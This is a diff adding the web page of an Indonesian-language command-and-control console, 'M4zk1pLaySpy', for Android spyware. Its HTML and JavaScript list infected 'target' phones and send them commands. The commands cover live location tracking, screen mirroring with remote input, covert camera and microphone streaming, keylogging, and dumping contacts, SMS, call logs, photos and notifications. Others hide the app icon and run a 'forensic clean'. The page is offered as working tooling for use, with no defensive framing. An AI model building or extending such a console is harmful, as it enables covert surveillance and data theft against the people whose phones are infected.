@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Target — M4zk1pLaySpy</title>
+<link rel="stylesheet" href="/static/css/style.css">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+</head>
+<body>
+<div class="shell">
+  <aside class="side">
+    <div class="brand"><img src="/static/img/garuda.svg" alt=""><div><b>M4ZK1PL4Y</b><span>SPY CONSOLE</span></div></div>
+    <nav class="nav">
+      <a href="/dashboard">▣ <span class="lbl">DASHBOARD</span></a>
+      <a href="/targets">◈ <span class="lbl">TARGET</span><i class="dot" id="navDot">0</i></a>
+      <a href="/build">⚙ <span class="lbl">BUILD APK</span></a>
+      <a href="/dumps">⇩ <span class="lbl">HASIL DUMP</span></a>
+      <a href="/admin">☰ <span class="lbl">ADMIN</span></a>
+    </nav>
+    <div class="side-foot"><div id="clock">--:--:--</div>
+      <div style="margin-top:6px">v1.4.0 · <span id="rtLed" class="led"></span> realtime</div>
+      <a href="#" id="logout" style="display:block;margin-top:10px;color:var(--red)">▸ KELUAR</a></div>
+  </aside>
+
+  <main class="main">
+    <header class="top">
+      <h2 class="glitch" data-t="TARGET">TARGET</h2>
+      <span class="pill on"><i class="led on"></i><span id="onCount">0</span> ONLINE</span>
+      <div class="spacer"></div>
+      <input class="inp" id="q" placeholder="cari brand / model / ip" style="width:230px;padding:8px 12px;letter-spacing:0">
+      <select class="inp" id="filter" style="width:130px;padding:8px 12px">
+        <option value="all">SEMUA</option><option value="online">ONLINE</option><option value="offline">OFFLINE</option>
+      </select>
+    </header>
+
+    <div class="content" style="display:grid;grid-template-columns:330px minmax(0,1fr);gap:14px;align-items:start">
+      <div class="card" style="position:sticky;top:74px">
+        <div class="card-h"><b>DAFTAR PERANGKAT</b><div class="spacer"></div><span class="tag" id="cnt">0</span></div>
+        <div class="card-b"><div class="t-list" id="list" style="max-height:calc(100vh - 190px);overflow:auto"></div></div>
+      </div>
+
+      <div class="card" id="panel">
+        <div class="card-h"><b id="pName">PILIH TARGET</b><div class="spacer"></div>
+          <span class="pill" id="pState"><i class="led"></i>—</span></div>
+        <div class="tabs" id="tabs">
+          <button class="tab on" data-p="p-info">INFO</button>
+          <button class="tab" data-p="p-loc">LOKASI</button>
+          <button class="tab" data-p="p-scr">LAYAR</button>
+          <button class="tab" data-p="p-cam">KAMERA</button>
+          <button class="tab" data-p="p-aud">AUDIO</button>
+          <button class="tab" data-p="p-dump">DUMP</button>
+          <button class="tab" data-p="p-not">NOTIF</button>
+          <button class="tab" data-p="p-extra">LAINNYA</button>
+        </div>
+        <div class="card-b" style="padding:0" id="panes">
+          <div class="pane on" id="p-info">
+            <div class="kv" id="infoKv"><div class="k">—</div><div class="v">pilih target dulu</div></div>
+            <div class="row" style="margin-top:14px">
+              <button class="btn sm ghost" data-c="info">Muat Info</button>
+              <button class="btn sm ghost" data-c="ping">Ping</button>
+              <button class="btn sm ghost" data-c="dump_net">Jaringan</button>
+              <button class="btn sm ghost" data-c="forensic_clean">Forensic Clean</button>
+            </div>
+            <div class="console" id="log" style="margin-top:14px"></div>
+          </div>
+
+          <div class="pane" id="p-loc">
+            <div class="row" style="margin-bottom:10px">
+              <button class="btn sm" data-c="locate_start">MULAI LIVE</button>
+              <button class="btn sm ghost" data-c="locate_once">SEKALI</button>
+              <button class="btn sm ghost" data-c="locate_stop">STOP</button>
+            </div>
+            <div id="map"></div>
+            <div class="kv" style="margin-top:10px"><div class="k">KOORDINAT</div><div class="v" id="coord">—</div></div>
+          </div>
+
+          <div class="pane" id="p-scr">
+            <div class="row" style="margin-bottom:10px">
+              <button class="btn sm" data-c="screen_start">MULAI MIRROR</button>
+              <button class="btn sm ghost" data-c="screen_shot">TANGKAP</button>
+              <button class="btn sm ghost" data-c="screen_stop">STOP</button>
+            </div>
+            <div class="mirror" id="mirror"><div class="idle">belum ada stream<br>tekan MULAI MIRROR</div><img id="mimg" alt="" hidden></div>
+            <div class="row" style="margin-top:10px">
+              <button class="btn sm ghost" data-k="back">◀ BACK</button>
+              <button class="btn sm ghost" data-k="home">HOME</button>
+              <button class="btn sm ghost" data-k="recents">RECENTS</button>
+              <button class="btn sm ghost" data-k="lock">KUNCI</button>
+            </div>
+            <div class="row" style="margin-top:8px">
+              <input class="inp" id="txtIn" placeholder="kirim teks ke target" style="flex:1;letter-spacing:0">
+              <button class="btn sm" id="txtGo">KIRIM</button>
+            </div>
+          </div>
+
+          <div class="pane" id="p-cam">
+            <div class="row" style="margin-bottom:10px">
+              <button class="btn sm" data-c="cam_back">KAMERA BELAKANG</button>
+              <button class="btn sm amber" data-c="cam_front">KAMERA DEPAN</button>
+              <button class="btn sm ghost" data-c="cam_stop">STOP</button>
+            </div>
+            <div class="mirror" id="camBox"><div class="idle">tidak ada kamera aktif</div><img id="cimg" alt="" hidden></div>
+          </div>
+
+          <div class="pane" id="p-aud">
+            <div class="row" style="margin-bottom:12px">
+              <button class="btn sm" data-c="mic_start">DENGARKAN MIC</button>
+              <button class="btn sm ghost" data-c="mic_stop">STOP MIC</button>
+            </div>
+            <div class="field"><label>PUTAR AUDIO DI TARGET (URL)</label>
+              <div class="row"><input class="inp" id="audUrl" placeholder="https://…/suara.mp3" style="flex:1;letter-spacing:0">
+              <button class="btn sm" id="audPlay">PUTAR</button></div></div>
+            <div class="field"><label>PUSH VIDEO + AUTOPLAY</label>
+              <div class="row"><input class="inp" id="vidUrl" placeholder="https://…/klip.mp4" style="flex:1;letter-spacing:0">
+              <button class="btn sm amber" id="vidPlay">PUTAR</button></div></div>
+            <div class="field"><label>VOLUME TARGET</label>
+              <div class="row"><input class="inp" id="vol" type="range" min="0" max="15" value="8" style="flex:1">
+              <button class="btn sm ghost" id="volGo">SET</button></div></div>
+            <audio id="micAudio" controls style="width:100%;margin-top:10px"></audio>
+          </div>
+
+          <div class="pane" id="p-dump">
+            <div class="chips" style="margin-bottom:12px">
+              <button class="chip" data-c="dump_contacts">KONTAK</button>
+              <button class="chip" data-c="dump_sms">SMS</button>
+              <button class="chip" data-c="dump_calls">LOG TELEPON</button>
+              <button class="chip" data-c="dump_gallery">GALERI</button>
+              <button class="chip" data-c="dump_apps">APLIKASI</button>
+              <button class="chip" data-c="dump_keylog">KEYLOG</button>
+            </div>
+            <div class="console" id="dlog" style="height:150px"></div>
+            <div style="margin-top:12px"><table><thead><tr><th>Jenis</th><th>File</th><th>Ukuran</th><th></th></tr></thead>
+              <tbody id="drows"><tr><td colspan="4" class="empty">belum ada</td></tr></tbody></table></div>
+          </div>
+
+          <div class="pane" id="p-not">
+            <div class="row" style="margin-bottom:10px">
+              <button class="btn sm" data-c="notif_start">AKTIFKAN LISTENER</button>
+              <button class="btn sm ghost" data-c="notif_stop">MATIKAN</button>
+              <button class="btn sm ghost" data-c="dump_notif">AMBIL SEKARANG</button>
+            </div>
+            <div class="console" id="nlog" style="height:320px"></div>
+          </div>
+
+          <div class="pane" id="p-extra">
+            <div class="row" style="margin-bottom:12px">
+              <button class="btn sm ghost" data-c="hide_icon">SEMBUNYIKAN IKON</button>
+              <button class="btn sm ghost" data-c="show_icon">TAMPILKAN IKON</button>
+              <button class="btn sm amber" data-c="lock_screen">KUNCI LAYAR</button>
+              <button class="btn sm ghost" data-c="delay_mode">MODE DELAY</button>
+              <button class="btn sm ghost" data-c="vibrate">GETAR</button>
+            </div>
+            <div class="field"><label>WALLPAPER TARGET (URL)</label>
+              <div class="row"><input class="inp" id="wallUrl" placeholder="https://…/wall.jpg" style="flex:1;letter-spacing:0">
+              <button class="btn sm" id="wallGo">SET</button></div></div>
+            <div class="field"><label>BUKA URL DI TARGET</label>
+              <div class="row"><input class="inp" id="openUrl" placeholder="https://…" style="flex:1;letter-spacing:0">
+              <button class="btn sm ghost" id="openGo">BUKA</button></div></div>
+            <div class="field"><label>TOAST / PESAN</label>
+              <div class="row"><input class="inp" id="toastMsg" placeholder="pesan singkat" style="flex:1;letter-spacing:0">
+              <button class="btn sm ghost" id="toastGo">KIRIM</button></div></div>
+            <div class="row" style="margin-top:14px">
+              <button class="btn sm ghost" data-c="kill_self">MATIKAN AGENT</button>
+              <button class="btn sm ghost" id="delTarget">HAPUS TARGET</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+<div class="toast-wrap" id="tw"></div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script type="module">
+import { $, $$, api, post, toast, esc, fmt, clock, markNav } from '/static/js/core.js';
+import { connect, on, send, statusLed } from '/static/js/ws.js';
+
+markNav(); clock($('#clock')); statusLed($('#rtLed'));
+let current = null;
+let map = null;
+let marker = null;
+let micStream = null;
+
+$('#logout').onclick = async (e) => { e.preventDefault(); await post('/api/logout'); location.href = '/'; };
+
+function log(box, msg, cls = '') {
+  const b = $(box); if (!b) return;
+  const d = document.createElement('div');
+  d.innerHTML = `<span class="tm">${fmt.time(Date.now()/1000)}</span> <span class="${cls}">${esc(msg)}</span>`;
+  b.prepend(d);
+  while (b.children.length > 200) b.lastChild.remove();
+}
+
+$$('#tabs .tab').forEach((t) => {
+  t.onclick = () => {
+    $$('#tabs .tab').forEach((x) => x.classList.remove('on'));
+    $$('.pane').forEach((p) => p.classList.remove('on'));
+    t.classList.add('on');
+    $('#' + t.dataset.p).classList.add('on');
+    if (t.dataset.p === 'p-loc' && map) setTimeout(() => map.invalidateSize(), 60);
+  };
+});
+
+function ensureMap() {
+  if (map || !window.L) return;
+  map = L.map('map', { zoomControl: true, attributionControl: false }).setView([-2.5, 118], 5);
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { maxZoom: 19 }).addTo(map);
+}
+
+function setPoint(lat, lon, label) {
+  ensureMap();
+  if (!map) return;
+  $('#coord').textContent = `${lat}, ${lon}`;
+  if (marker) marker.setLatLng([lat, lon]);
+  else marker = L.marker([lat, lon]).addTo(map);
+  marker.bindPopup(label || 'target').openPopup();
+  map.setView([lat, lon], 16);
+}
+
+async function loadList() {
+  const q = $('#q').value.trim();
+  const f = $('#filter').value;
+  const d = await api(`/api/targets?status=${f}&q=${encodeURIComponent(q)}`);
+  $('#onCount').textContent = d.stats.online;
+  $('#navDot').textContent = d.stats.online;
+  $('#cnt').textContent = d.targets.length;
+  $('#list').innerHTML = d.targets.map((t) => `
+    <div class="t-row ${t.id === current ? 'sel' : ''}" data-id="${esc(t.id)}">
+      <div class="av">${esc((t.brand || '?')[0]).toUpperCase()}</div>
+      <div><div class="nm">${esc(t.brand)} ${esc(t.model)}</div>
+        <div class="mt">${esc(t.ip || '-')} · ${fmt.ago(t.last_seen)}</div></div>
+      <span class="led ${t.online ? 'on' : ''}"></span>
+    </div>`).join('') || '<div class="empty">tidak ada target</div>';
+  $$('#list .t-row').forEach((r) => { r.onclick = () => select(r.dataset.id); });
+}
+
+async function select(id) {
+  current = id;
+  $$('#list .t-row').forEach((r) => r.classList.toggle('sel', r.dataset.id === id));
+  const d = await api('/api/targets/' + id);
+  const t = d.target;
+  $('#pName').textContent = `${t.brand || ''} ${t.model || ''} · ${t.id}`.trim();
+  $('#pState').className = 'pill ' + (t.online ? 'on' : 'off');
+  $('#pState').innerHTML = `<i class="led ${t.online ? 'on' : ''}"></i>${t.online ? 'ONLINE' : 'OFFLINE'}`;
+  $('#infoKv').innerHTML = [
+    ['Label', t.label], ['Brand', t.brand], ['Model', t.model], ['Android', t.android],
+    ['SDK', t.sdk], ['IP', t.ip], ['ISP', t.isp], ['Negara', t.country],
+    ['Kota', t.city], ['Baterai', (t.battery || 0) + '%'], ['Charging', t.charging ? 'ya' : 'tidak'],
+    ['Storage bebas', fmt.bytes(t.storage_free)], ['Pertama', fmt.date(t.first_seen)],
+    ['Terakhir', fmt.date(t.last_seen)], ['Catatan', t.notes || '-'],
+  ].map(([k, v]) => `<div class="k">${esc(k)}</div><div class="v">${esc(v ?? '-')}</div>`).join('');
+  if (t.lat && t.lon) setPoint(t.lat, t.lon, t.model);
+  loadDumps();
+  if (window.innerWidth < 900) $('#panel').scrollIntoView({ behavior: 'smooth' });
+}
+
+async function cmd(type, args = {}) {
+  if (!current) return toast('Pilih target dulu.', 'wn');
+  try {
+    const r = await post(`/api/control/${current}/${type}`, args);
+    log('#log', `${type} terkirim${r.queued ? ' (diantrikan)' : ''}`, r.queued ? 'wn' : 'ok');
+  } catch (e) { toast(e.message, 'wn'); }
+}
+
+$$('[data-c]').forEach((b) => { b.onclick = () => cmd(b.dataset.c); });
+$$('[data-k]').forEach((b) => {
+  b.onclick = () => cmd('key', { code: b.dataset.k });
+});
+
+$('#txtGo').onclick = () => { const v = $('#txtIn').value; if (v) { cmd('text', { text: v }); $('#txtIn').value = ''; } };
+$('#audPlay').onclick = () => cmd('speaker_play', { url: $('#audUrl').value, kind: 'audio' });
+$('#vidPlay').onclick = () => cmd('media_push', { url: $('#vidUrl').value, kind: 'video' });
+$('#volGo').onclick = () => cmd('volume', { level: Number($('#vol').value) });
+$('#wallGo').onclick = () => cmd('wallpaper_set', { url: $('#wallUrl').value });
+$('#openGo').onclick = () => cmd('open_url', { url: $('#openUrl').value });
+$('#toastGo').onclick = () => cmd('toast', { text: $('#toastMsg').value });
+$('#delTarget').onclick = async () => {
+  if (!current || !confirm('Hapus target ini dari C2?')) return;
+  await api('/api/targets/' + current, { method: 'DELETE' });
+  current = null; loadList(); toast('Target dihapus.', 'ok');
+};
+
+async function loadDumps() {
+  if (!current) return;
+  const d = await api('/api/dumps?target=' + current);
+  $('#drows').innerHTML = d.dumps.map((x) => `
+    <tr><td><span class="tag">${esc(x.kind)}</span></td>
+      <td class="mono">${esc(x.filename)}</td><td>${fmt.bytes(x.size)}</td>
+      <td><a class="btn sm ghost" href="/api/dumps/${esc(x.id)}/download">UNDUH</a></td></tr>`).join('')
+    || '<tr><td colspan="4" class="empty">belum ada</td></tr>';
+}
+
+on('stream', (m) => {
+  if (m.target !== current) return;
+  if (m.kind === 'screen' && m.b64) {
+    const img = $('#mimg'); img.hidden = false; img.src = 'data:image/jpeg;base64,' + m.b64;
+    $('#mirror .idle')?.remove();
+  }
+  if (m.kind === 'cam' && m.b64) {
+    const img = $('#cimg'); img.hidden = false; img.src = 'data:image/jpeg;base64,' + m.b64;
+    $('#camBox .idle')?.remove();
+  }
+  if (m.kind === 'mic' && m.b64) {
+    const a = $('#micAudio');
+    a.src = 'data:audio/mp4;base64,' + m.b64;
+    a.play().catch(() => {});
+  }
+});
+on('result', (m) => {
+  if (m.target !== current) return;
+  const data = m.data || {};
+  log('#log', `${m.id} → ${m.ok ? 'OK' : 'GAGAL'}`, m.ok ? 'ok' : 'er');
+  if (data.lat) setPoint(data.lat, data.lon, 'target');
+  if (data.notif) log('#nlog', data.notif);
+  if (m.type === 'dump_*' || data.saved) loadDumps();
+});
+on('dump', (m) => { if (m.target === current) { log('#dlog', `dump ${m.kind} · ${fmt.bytes(m.size)}`, 'ok'); loadDumps(); } });
+on('presence', (m) => { loadList(); if (m.id === current) select(current); });
+on('targets_dirty', loadList);
+
+$('#q').oninput = () => loadList();
+$('#filter').onchange = () => loadList();
+
+const params = new URLSearchParams(location.search);
+connect();
+loadList().then(() => { if (params.get('t')) select(params.get('t')); });
+setInterval(loadList, 15000);
+</script>
+</body>
+</html>
